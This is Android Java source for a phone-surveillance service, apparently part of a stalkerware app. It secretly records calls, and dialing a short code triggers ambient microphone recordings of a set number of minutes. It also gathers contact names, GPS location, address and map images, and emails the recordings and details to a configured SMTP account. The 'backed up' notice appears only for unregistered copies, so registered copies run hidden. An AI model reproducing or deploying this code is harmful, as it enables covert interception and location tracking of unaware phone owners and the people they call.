package com.shiliukeji.xc_lsy.androidkillerservice.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.elvishew.xlog.XLog;
import com.shiliukeji.xc_lsy.androidkillerservice.R;
import com.shiliukeji.xc_lsy.androidkillerservice.location.Location;

import java.io.File;
import java.util.List;

/**
 * Created by XC_LSY on 2017/7/6.
 */
@Deprecated
public class PhoneServicebak extends Service {
    private static MediaRecorder mediaRecorder;
    private String addr;
    private String baiduMap;
    private File file;
    private File filedir;
    private boolean huanjingluyinFlag = false;
    private boolean incomingFlag = false;
    private String incoming_number;
    private boolean isPath = false;
    private boolean isRecord = false;
    private boolean isSended = false;
    public String outphoneNumber;
    private String pName;
    private GetSharePrefe paras;
    private String path;
    private String phoneNumber;
    private String poiString;
    private String shoujiName;
    private long startTime = 0;
    private long stopTime = 0;
    private SharedPreferences zcps;

    private final class myPhoneStateListener extends PhoneStateListener {
        private myPhoneStateListener() {
        }

        public void onCallStateChanged(int state, String incomingNumber) {
            switch (state) {
                case 0:
                    if (PhoneServicebak.mediaRecorder == null || !PhoneServicebak.this.isRecord || PhoneServicebak.this.file.length() <= 400) {
                        PhoneServicebak.mediaRecorder = null;
                        PhoneServicebak.this.isRecord = false;
                    } else {
                        PhoneServicebak.this.stopRecording();
                    }
                    if (PhoneServicebak.this.startTime != 0) {
                        PhoneServicebak.this.stopTime = System.currentTimeMillis();
                        String temp = PhoneServicebak.this.getNowState();
                        if (PhoneServicebak.this.paras.isWeizhijilu()) {
                            PhoneServicebak.this.getUserLocation();
                        }
                        String subject = new StringBuilder(String.valueOf(PhoneServicebak.this.shoujiName)).append("发来--电话邮件(").append(temp).append("；位置:").append(PhoneServicebak.this.addr).append(")").toString();
                        String content = "邮件标题：" + subject + "<br/>" + temp + "(" + PhoneServicebak.this.pName + ")<br/>通话时长：" + OtherOperatorService.getTimeLenth(PhoneServicebak.this.startTime, PhoneServicebak.this.stopTime) + "(开始时间：" + OtherOperatorService.getCurrentTime(Long.valueOf(PhoneServicebak.this.startTime)) + ")" + "<br/>通话内容：见附件" + PhoneServicebak.this.phoneNumber + "<br/>附近信息：" + PhoneServicebak.this.poiString + "<br/>" + PhoneServicebak.this.baiduMap + "<br/>----------------------------------------<br/>" + OtherOperatorService.getTxtHistory(new File(PhoneServicebak.this.filedir, "phone.txt"));
                        if (OtherOperatorService.check3Gwifi(PhoneServicebak.this.getApplicationContext())) {
                            if (!PhoneServicebak.this.isSended && PhoneServicebak.this.paras.isUserSetOk()) {
                                String smtp = PhoneServicebak.this.paras.getSmtp();
                                String port = PhoneServicebak.this.paras.getPort();
                                String useremail = PhoneServicebak.this.paras.getUserEmail();
                                String password = PhoneServicebak.this.paras.getUserPassword();
                                if (PhoneServicebak.this.file.exists()) {
                                    List<String> paths = OtherOperatorService.getFilePathList(PhoneServicebak.this.filedir);
                                    if (PhoneServicebak.this.paras.isAllnet()) {
                                        OtherOperatorService.uploadEmail(paths, PhoneServicebak.this.path, smtp, port, useremail, password, useremail, useremail, subject, content);
                                        PhoneServicebak.this.sendTongZhi(useremail, temp);
                                    } else if (PhoneServicebak.this.paras.isWifi() && OtherOperatorService.checkwifiwork(PhoneServicebak.this.getApplicationContext())) {
                                        OtherOperatorService.uploadEmail(paths, PhoneServicebak.this.path, smtp, port, useremail, password, useremail, useremail, subject, content);
                                        PhoneServicebak.this.sendTongZhi(useremail, temp);
                                    } else {
                                        PhoneServicebak.this.file = new File(PhoneServicebak.this.filedir, "phone.txt");
                                        if (PhoneServicebak.this.file.exists()) {
                                            PhoneServicebak.this.file.delete();
                                            PhoneServicebak.this.file = new File(PhoneServicebak.this.filedir, "phone.txt");
                                        }
                                        OtherOperatorService.txtFileSave(PhoneServicebak.this.file, "1" + content);
                                    }
                                } else {
                                    OtherOperatorService.uploadEmail(smtp, port, useremail, password, useremail, new String[]{useremail}, subject, content);
                                    PhoneServicebak.this.sendTongZhi(useremail, temp);
                                }
                                PhoneServicebak.this.isSended = true;
                                PhoneServicebak.this.startTime = 0;
                                PhoneServicebak.this.stopTime = 0;
                                PhoneServicebak.this.incomingFlag = false;
                                PhoneServicebak.this.file = null;
                                PhoneServicebak.this.filedir = null;
                                PhoneServicebak.this.path = null;
                                PhoneServicebak.this.phoneNumber = null;
                                PhoneServicebak.this.outphoneNumber = null;
                                PhoneServicebak.this.pName = null;
                                PhoneServicebak.this.isRecord = false;
                                PhoneServicebak.this.isPath = false;
                                return;
                            }
                            return;
                        } else if (!"".equals(subject)) {
                            PhoneServicebak.this.file = new File(PhoneServicebak.this.filedir, "phone.txt");
                            if (PhoneServicebak.this.file.exists()) {
                                PhoneServicebak.this.file.delete();
                                PhoneServicebak.this.file = new File(PhoneServicebak.this.filedir, "phone.txt");
                            }
                            OtherOperatorService.txtFileSave(PhoneServicebak.this.file, "0" + content);
                            PhoneServicebak.this.startTime = 0;
                            PhoneServicebak.this.stopTime = 0;
                            PhoneServicebak.this.incomingFlag = false;
                            PhoneServicebak.this.file = null;
                            PhoneServicebak.this.filedir = null;
                            PhoneServicebak.this.path = null;
                            PhoneServicebak.this.phoneNumber = null;
                            PhoneServicebak.this.outphoneNumber = null;
                            PhoneServicebak.this.pName = null;
                            subject = "";
                            PhoneServicebak.this.isRecord = false;
                            PhoneServicebak.this.isPath = false;
                            return;
                        } else {
                            return;
                        }
                    }
                    PhoneServicebak.this.incomingFlag = false;
                    return;
                case 1:
                    PhoneServicebak.this.incomingFlag = true;
                    PhoneServicebak.this.incoming_number = incomingNumber;
                    PhoneServicebak.this.pName = OtherOperatorService.getContactNameFromPhoneBook(PhoneServicebak.this.getApplicationContext(), incomingNumber);
                    return;
                case 2:
                    if (PhoneServicebak.mediaRecorder == null && !PhoneServicebak.this.isRecord) {
                        PhoneServicebak.this.readyFile();
                        PhoneServicebak.this.isSended = false;
                        if (PhoneServicebak.this.paras.isTonghualuyin() && PhoneServicebak.this.isPath) {
                            PhoneServicebak.this.startRecording();
                            return;
                        }
                        return;
                    }
                    return;
                default:
                    return;
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        Location location = new Location();
        Location.updateListener();
        try {
            this.outphoneNumber = intent.getExtras().getString("outNumber");
            XLog.d("获取电话号码：" + outphoneNumber);
            this.pName = OtherOperatorService.getContactNameFromPhoneBook(getApplicationContext(), this.outphoneNumber);
        } catch (Exception e) {
            e.printStackTrace();
            XLog.d("未获取电话号码");
        }
        this.paras = new GetSharePrefe(getApplicationContext());
        this.zcps = getApplicationContext().getSharedPreferences("reg", 0);
        this.shoujiName = this.paras.getShoujiName();
        if (this.outphoneNumber == null || this.outphoneNumber.length() >= 3) {
            if (!this.isRecord) {
                XLog.d("发送邮件信息！");
                ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).listen(new myPhoneStateListener(), 32);
            }
        } else if (!this.isRecord) {
            this.huanjingluyinFlag = true;
            readyFile();
            new Thread(new Runnable() {
                public void run() {
                    try {
                        if (PhoneServicebak.this.isPath) {
                            PhoneServicebak.this.startRecording();
                        }
                        Thread.sleep((long) ((Integer.parseInt(PhoneServicebak.this.outphoneNumber) * 60) * 1000));
                        if (PhoneServicebak.mediaRecorder == null || !PhoneServicebak.this.isRecord) {
                            PhoneServicebak.mediaRecorder = null;
                            PhoneServicebak.this.isRecord = false;
                        } else {
                            PhoneServicebak.this.stopRecording();
                            PhoneServicebak.this.stopTime = System.currentTimeMillis();
                        }
                        String temp = PhoneServicebak.this.getNowState();
                        PhoneServicebak.this.huanjingluyinFlag = false;
                        if (PhoneServicebak.this.paras.isWeizhijilu()) {
                            PhoneServicebak.this.getUserLocation();
                        }
                        String subject = new StringBuilder(String.valueOf(PhoneServicebak.this.shoujiName)).append("发来--环录邮件(").append(temp).append("；位置:").append(PhoneServicebak.this.addr).append(")").toString();
                        String content = "邮件标题：" + subject + "<br/>" + temp + "<br/>" + "<br/>环录内容：见附件" + PhoneServicebak.this.phoneNumber + "<br/>附近信息：" + PhoneServicebak.this.poiString + "<br/>" + PhoneServicebak.this.baiduMap + "<br/>----------------------------------------<br/>" + OtherOperatorService.getTxtHistory(new File(PhoneServicebak.this.filedir, "phone.txt"));
                        if (OtherOperatorService.checkwifiwork(PhoneServicebak.this.getApplicationContext())) {
                            String smtp = PhoneServicebak.this.paras.getSmtp();
                            String port = PhoneServicebak.this.paras.getPort();
                            String useremail = PhoneServicebak.this.paras.getUserEmail();
                            String password = PhoneServicebak.this.paras.getUserPassword();
                            if (PhoneServicebak.this.file.exists()) {
                                OtherOperatorService.uploadEmail(OtherOperatorService.getFilePathList(PhoneServicebak.this.filedir), PhoneServicebak.this.path, smtp, port, useremail, password, useremail, useremail, subject, content);
                            } else {
                                String str = smtp;
                                String str2 = port;
                                String str3 = useremail;
                                String str4 = password;
                                String str5 = useremail;
                                OtherOperatorService.uploadEmail(str, str2, str3, str4, str5, new String[]{useremail}, subject, "录音文件不存在，本次环境录音未成功");
                            }
                        } else {
                            PhoneServicebak.this.file = new File(PhoneServicebak.this.filedir, "phone.txt");
                            if (PhoneServicebak.this.file.exists()) {
                                PhoneServicebak.this.file.delete();
                                PhoneServicebak.this.file = new File(PhoneServicebak.this.filedir, "phone.txt");
                            }
                            OtherOperatorService.txtFileSave(PhoneServicebak.this.file, "0" + content);
                        }
                        PhoneServicebak.this.startTime = 0;
                        PhoneServicebak.this.file = null;
                        PhoneServicebak.this.filedir = null;
                        PhoneServicebak.this.path = null;
                        PhoneServicebak.this.phoneNumber = null;
                        PhoneServicebak.this.outphoneNumber = null;
                        PhoneServicebak.this.pName = null;
                        PhoneServicebak.this.isRecord = false;
                        PhoneServicebak.this.isPath = false;
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
        return Service.START_STICKY;
    }

    public void startRecording() {
        if (this.paras.isTonghualuyin()) {
            try {
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setAudioSource(4);
                mediaRecorder.setAudioSamplingRate(16000);
                mediaRecorder.setOutputFormat(3);
                mediaRecorder.setAudioEncoder(1);
                mediaRecorder.setOutputFile(this.file.getAbsolutePath());
                mediaRecorder.prepare();
                mediaRecorder.start();
                this.isRecord = true;
            } catch (Exception e) {
                this.isRecord = false;
                mediaRecorder.reset();
                mediaRecorder.release();
                mediaRecorder = null;
            }
        }
    }

    public String getNowState() {
        String temp = "";
        if (this.huanjingluyinFlag) {
            return "环录:" + this.outphoneNumber + "分钟";
        }
        if (this.incomingFlag) {
            return "来电:" + this.incoming_number;
        }
        return "去电:" + this.outphoneNumber;
    }

    public void getUserLocation() {
        double tempj = Location.getLocation().getLongitude();
        String temps = new StringBuilder(String.valueOf(tempj)).append(",").append(Location.getLocation().getLatitude()).toString();
        this.baiduMap = "<img src=http://api.map.baidu.com/staticimage?center=" + temps + "&width=280&height=160&zoom=18&markers=" + temps + "&scale=2 />";
        this.addr = Location.getLocation().getAddr();
        if (this.addr == null) {
            this.addr = "位置信息不明";
        }
        String temppoi = Location.getLocation().getPoiStr();
        if (temppoi == null) {
            this.poiString = "位置周边信息不明";
        } else {
            this.poiString = OtherOperatorService.getSubstring(temppoi);
        }
    }

    public void sendTongZhi(String useremail, String temp) {
        if (!OtherOperatorService.isReg(this.paras.getUserEmail(), this.paras.getShoujiImei(), this.zcps.getString("zhucema", ""))) {
            OtherOperatorService.showNotisfy(getApplicationContext(), R.drawable.mytp, "温馨提示:你刚才的电话记录已为你备份至" + useremail + "邮箱", "温馨提示", new StringBuilder(String.valueOf(temp)).append("记录已为你备份至").append(useremail).append("邮箱").toString());
        }
    }

    public void stopRecording() {
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
        } catch (Exception e) {
            e.printStackTrace();
        }
        mediaRecorder = null;
        this.isRecord = false;
    }

    public void readyFile() {
        this.path = OtherOperatorService.setJtingPath(getApplicationContext());
        this.startTime = System.currentTimeMillis();
        if (this.path != null) {
            this.filedir = new File(this.path);
            if (!this.filedir.exists()) {
                this.filedir.mkdir();
            }
            if (this.incomingFlag) {
                this.phoneNumber = "laidian" + this.incoming_number + "_" + this.startTime + ".amr";
            } else if (this.huanjingluyinFlag) {
                this.phoneNumber = "hjluyin" + this.outphoneNumber + "_" + this.startTime + ".amr";
            } else {
                this.phoneNumber = "qudian" + this.outphoneNumber + "_" + this.startTime + ".amr";
            }
            this.file = new File(this.filedir, this.phoneNumber);
            this.isPath = true;
        }
    }

    public void onCreate() {
        super.onCreate();
        Log.i("111", "service线程：" + Thread.currentThread().getId());
    }
}

